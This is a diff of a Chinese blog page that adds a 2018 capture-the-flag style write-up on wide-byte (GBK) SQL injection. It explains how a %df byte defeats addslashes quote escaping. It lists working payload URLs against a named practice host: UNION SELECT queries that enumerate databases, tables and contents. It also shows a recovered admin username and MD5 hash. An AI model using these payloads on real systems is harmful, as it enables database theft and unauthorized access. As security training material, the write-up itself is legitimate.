@@ -79,13 +79,23 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="豆浆油条">
-<meta property="og:url" content="http://www.anonym1ty.cn/archives/2018/index.html">
+<meta name="description" content="记一次宽字节注入的练习。 宽字节注入原理：GBK 占用两字节　　ASCII占用一字节　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="宽字节注入">
+<meta property="og:url" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/index.html">
 <meta property="og:site_name" content="豆浆油条">
+<meta property="og:description" content="记一次宽字节注入的练习。 宽字节注入原理：GBK 占用两字节　　ASCII占用一字节　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/1.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/2.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/3.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/4.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/5.png">
+<meta property="og:updated_time" content="2018-08-16T01:29:22.482Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="豆浆油条">
+<meta name="twitter:title" content="宽字节注入">
+<meta name="twitter:description" content="记一次宽字节注入的练习。 宽字节注入原理：GBK 占用两字节　　ASCII占用一字节　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。">
+<meta name="twitter:image" content="http://www.anonym1ty.cn/2018/08/16/宽字节注入/1.png">
 
 
 
@@ -115,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://www.anonym1ty.cn/archives/2018/"/>
+  <link rel="canonical" href="http://www.anonym1ty.cn/2018/08/16/宽字节注入/"/>
 
 
 
 
 
-  <title>Archive | 豆浆油条</title>
+  <title>宽字节注入 | 豆浆油条</title>
   
 
 
@@ -140,7 +150,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -214,111 +224,153 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        Um..! 2 posts in total. Keep on posting.
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.anonym1ty.cn/2018/08/16/宽字节注入/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="豆浆油条">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="豆浆油条">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/08/16/宽字节注入/" itemprop="url">
-              
-                <span itemprop="name">宽字节注入</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">宽字节注入</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-16T09:12:00+08:00"
-              content="2018-08-16" >
-          08-16
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-16T09:12:00+08:00">
+                2018-08-16
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/16/宽字节注入/" class="leancloud_visitors" data-flag-title="宽字节注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/14/SQL注入/" itemprop="url">
-              
-                <span itemprop="name">SQL注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-14T19:20:00+08:00"
-              content="2018-08-14" >
-          08-14
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <p>记一次宽字节注入的练习。</p>
+<h2 id="宽字节注入原理："><a href="#宽字节注入原理：" class="headerlink" title="宽字节注入原理："></a>宽字节注入原理：</h2><p>GBK 占用两字节<br>　　ASCII占用一字节<br>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。<br>　　输入%df和函数执行添加的%5C，被合并成<code>%df%5C</code>。由于GBK是两字节，这个<code>%df%5C</code>被MYSQL识别为GBK。导致本应的<code>%df\</code>变成<code>%df%5C</code>。<code>%df%5C</code>在GBK编码中没有对应，所以被当成无效字符。<br>　　<code>%DF</code> ：会被PHP当中的addslashes函数转义为<code>“%DF\&#39;”</code> ，<code>“\”</code>既URL里的<code>%5C</code>，那么也就是说，<code>“%DF&#39;”</code>会被转成<code>“%DF%5C%27”</code>倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为<code>“%DF%5C%27”</code>是一个宽字符。也就是<code>“縗’”</code><br>题目地址：[题目传送]<br>[题目传送]:<a href="http://wpt5.xiniani.org/?id=1" target="_blank" rel="noopener">http://wpt5.xiniani.org/?id=1</a><br>做这题的时候充满了曲折，服务器原因，题目各种连不上，最后还是成功做出来了。<br>先来看看这题，题目刚进去就只有<br><img src="/2018/08/16/宽字节注入/1.png" alt="图片"><br>看见id=1可以联想到注入，可是试了各种方式都没用，经过ju5tw4nty0u师傅的提示，这题对单引号进行了转义，可以采用宽字节注入绕过。<br>于是先构造payload进行绕过单引号转义：<code>?id=1%D6%27%20AND 1=1--+</code>返回正常页面，再用<code>?id=1%D6%27%20AND 1=2--+</code>，则返回空白页面，说明我们成功的通过宽字节注入绕过了单引号转义。后面就是一些简单的注入过程，<br>先用order by查看字段数，发现存在3个字段，在第三个字段有q1005的库,payload:<br><code>http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+</code><br><img src="/2018/08/16/宽字节注入/2.png" alt="图片"><br>再查看q1005的表名，payload:<br><code>http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7131303035--+</code><br><img src="/2018/08/16/宽字节注入/3.png" alt="图片"><br>查看字段，payload:<br><code>http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(content)%20from%20q1005--+</code><br><img src="/2018/08/16/宽字节注入/4.png" alt="图片"><br>这个地方很坑，又遇见了熟悉的Hello,man!没看见flag，，，失败<br>最后只能去找找另一个表里的内容，同样的方法，在admin_ff表里找到一个用户名：<code>xinian</code>和密码：<code>c3cbd894ea3620ffceb088671363eda0</code><br>密码通过md5解密。然后通过登录得到flag<br><img src="/2018/08/16/宽字节注入/5.png" alt="图片"></p>
+
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/14/SQL注入/" rel="next" title="SQL注入">
+                <i class="fa fa-chevron-left"></i> SQL注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -326,6 +378,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -346,8 +402,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -435,6 +500,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入原理："><span class="nav-number">1.</span> <span class="nav-text">宽字节注入原理：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -568,6 +649,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
